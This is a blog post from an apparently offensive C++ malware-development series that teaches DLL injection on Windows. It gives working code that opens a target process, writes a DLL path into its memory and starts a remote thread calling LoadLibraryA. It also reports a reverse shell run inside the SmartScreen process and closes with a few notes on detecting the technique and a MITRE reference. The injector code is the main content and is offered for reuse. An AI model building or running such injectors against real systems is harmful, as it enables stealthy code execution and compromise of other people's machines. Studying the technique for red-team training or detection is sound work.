---
title: DLL injection
published: true
categories: [Malware dev, C++]
tags: [Malware dev, C++, Process injection]

pin: false
image:
  path: https://github.com/Krypteria/Offensive_CPP/assets/55555187/beaedd97-aaee-470c-a38d-08a1abce682a
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

For this second post of offensive C++ we are going to look at the DLL injection technique. This technique, like Remote process Injection, has been known for many years and we are not really going to re-invent the wheel here. Even so, it is very important to understand how it works as it will be useful for complex techniques.

The DLL injection technique consists, roughly speaking, of loading an external DLL into a remote process and making it execute its contents.

Before I start talking about the logic behind the technique and how we can program it using C++ I will show a practical example to get a better context of what we are talking about.

In the following image you can see how, after executing the .exe that performs the DLL injection, I obtained a reverse shell whose payload is executed under the Windows Defender SmartScreen.exe process. It should be noted that the tests are performed with AV disabled, you would have to do a couple more things to bypass the defender x). 
![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/9fd1c477-c80c-430b-9796-05657e1d8b98)

We can take a look at the memory address obtained by reserving memory and see that the absolute path to our DLL is stored there.
![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/dd7fcc35-1366-4b5b-8342-e9e03acc01f3)

Now that we have quickly seen the technique in action, let's see how we can program it in C++.

This first part is identical to the Remote process injection technique, we need to open a Handle to be able to interact with the process in which we want to perform the injection. In this case I still use the [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function of the Windows API.
```c++
DWORD pid = atoi(argv[1]);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

if (hProcess == NULL){
    printf("%s Cannot get the handle to the process\n", err);
    return EXIT_FAILURE;
}

printf("%s Handle to the process obtained\n", ok);
```

The next step is also almost identical to the one we executed in the first post, the only difference is that this time we cannot calculate the length of the variable using sizeof as we would be reserving a smaller space than we need as you can see in the following image:
![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/08c0a340-0bd3-48e0-a7f9-4bfa182698d6)

Instead, we have to use **strlen() + 1** (+1 because we have to count the terminating character of the string, the null byte).
```c++
const char* dllPath = argv[2];

LPVOID bAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

if(bAddress == NULL){
	printf("%s Cannot allocate memory for the dll\n", err, bAddress);
	return EXIT_FAILURE;
}

printf("%s Memory allocated succesfully in %p\n", ok, bAddress);
```

We write the path of the DLL in memory using the function [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) and strlen() to define the length of the variable to write.
```c++
if(WriteProcessMemory(hProcess, bAddress, dllPath, strlen(dllPath) + 1, NULL) == 0){
	printf("%s Cannot write on memory, error %d", err, GetLastError());
	return EXIT_FAILURE;
}

printf("%s Memory written succesfully\n", ok);
```

And we come to the last step, this last step is quite different from the one we did in the previous post. Recall that the idea of this technique is that the target process loads a DLL and then executes its contents. For this we can use the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. 

One of the mistakes we could make is the following:
```c++
LoadLibraryA(bAddress);
```
Some may ask, what's the problem?, you said that we need the LoadLibraryA function to load the DLL. That is correct, what is not correct is that, by doing it this way, we are **loading it into the process of the executable itself**, not into the process we want to infect. 

To inject into the remote process we need to **create a new Thread** in the target process and then have **the Thread call LoadLibraryA**. One way to do this would be to define an [LPTHREAD_START_ROUTINE](https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/lpthread-start-routine-function-pointer) which is just a pointer to a function. This presents us with a new challenge, we need the memory address of the LoadLibraryA function.

If we look at the documentation for the **LoadLibraryA** function we can see that it is located inside the **Kernel32.dll** DLL:

![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/77612b93-a83b-4f53-bf5c-484faa049250)

And how can we call a function inside a DLL?, easy, just as we can obtain a Handle from a process, we can also obtain it from a DLL using the function [GetModuleHandleA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) :
```c++
Handle hKernel32 = GetModuleHandleA("Kernel32.dll");
```

Once we have obtained the Handle we need to find the memory address of the LoadLibraryA function, for that, we can make use of the [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function which does exactly that:
```c++ 
LPVOID loadlibAddr = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
```

All this integrated in the code would look like this:
```c++
HANDLE hRemote = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), bAddress, 0, NULL);

if(hRemote == NULL){
	printf("%s Cannot get the handle to the remote process\n", err);
	return EXIT_FAILURE;
}

printf("%s Remote thread executed succesfully\n", ok);

CloseHandle(hProcess);
CloseHandle(hRemote);

return EXIT_SUCCESS;
```

With the code finished we would only have to compile it and we would get a binary capable of executing DLL injection. The complete code can be found in the [Offensive CPP](https://github.com/Krypteria/Offensive_CPP) repository on my Github.

Before I finish I would like to go back to the starting point of the post. The execution example:
![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/9fd1c477-c80c-430b-9796-05657e1d8b98)

If we take a closer look at the SmartScreen process we can find our DLL loaded correctly:
![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/011d3ce5-3c39-4104-b8b2-298c0dc48fb5)

A interesting thing that I discovered while playing with this technique is that if you change the name of the DLL once it has been loaded into the process, the name of the injected DLL also changes, which I found curious since the injection method is through a physical path, not a memory address. 

Another thing we can observe in the image is that, as it is not a signed DLL, it appears as *UNVERIFIED* which could make it easily detected by EDRs. 

Another easy way to detect this technique would be to look at its import table:
![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/f3d1b450-f81e-4513-9a2e-174c8612bbf0)

The appearance of certain windows API calls could raise suspicions. As always, here is a post from [Mitre](https://attack.mitre.org/techniques/T1055/001/) where the IOCs of this technique are analysed in more depth.

As an addition to this post I would like to explain briefly how we can create our custom DLL. It is really very simple, just as executables have a start function that is defined by the "main", DLLs have their own start function called "DllMain". In the following [link](https://learn.microsoft.com/es-es/windows/win32/dlls/dllmain) to the Windows documentation you can get a template of that function and be able to create your own DLLs.

See you in the next post :) 